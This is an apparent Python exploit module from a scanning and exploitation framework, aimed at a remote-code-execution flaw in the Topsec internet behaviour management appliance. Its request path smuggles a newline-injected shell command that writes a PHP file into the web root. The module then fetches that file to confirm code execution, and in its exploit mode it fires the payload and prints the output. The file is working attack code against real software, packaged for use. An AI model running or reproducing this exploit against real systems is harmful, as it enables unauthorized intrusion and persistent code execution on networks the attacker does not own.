from util.ExpRequest import ExpRequest,Output
from util.fun import *
import util.globalvar as GlobalVar
import prettytable as pt
"""
from ClassCongregation import Dnslog,random_name
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class HW2022():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
            
    def HW_2022_0804(self):
        appName = 'HW2022'
        pocname = 'HW_2022_0804'
        name = randomLowercase(6)+'.php'
        path = '/view/lPV6/naborTable/static_convert.php?blocks[0]=//%20echo%20%27%3C?php%20echo%20{};?%3E%27%20%3E%3E%20/var/www/html/{}%0a'.format(self.flag,name)
        method = 'get'
        desc = '[rce] app="天融信 上网行为管理系统"'
        data = ''
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(
                    url=self.url+path, 
                    data=data, 
                    )
                r = exprequest.get(
                    url=self.url+'/'+name, 
                    data=data, 
                    )
                if self.flag in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(
                    url=self.url+path,
                    data=data, 
                    ).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row([
    'HW2022',
    'HW_2022_0804',
    '[rce] app="天融信 上网行为管理系统"'
])
print(tb)

def check(**kwargs):
    thread_list = []
    ExpHW2022 = HW2022(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpHW2022, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(HW2022):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpHW2022, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)